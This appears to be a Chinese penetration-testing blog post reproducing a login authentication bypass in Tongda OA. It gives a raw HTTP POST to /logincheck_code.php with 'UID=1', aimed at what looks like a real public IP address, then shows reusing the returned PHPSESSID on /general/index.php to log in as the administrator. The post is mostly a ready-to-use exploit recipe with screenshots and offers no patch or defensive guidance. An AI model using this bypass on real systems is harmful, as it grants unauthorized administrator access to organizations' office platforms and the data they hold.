---
title: 【渗透测试】通达OA登录认证绕过
date: 2025-09-18
categories:
  - 渗透测试
image: images/77.webp
---
# 复现
开局一个登录框
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250918153639.png)
抓包构造POC
```php
POST /logincheck_code.php HTTP/1.1
Host: 61.184.199.14:8989
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
UID=1
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250918153710.png)
记录返回的PHPSESSID，在漏洞url后构建poc。
访问地址：
```
http://xxxx/general/index.php
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250918153753.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250918153810.png)
替换刚才记录的PHPSESSID，成功登录到管理员用户。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250918153846.png)
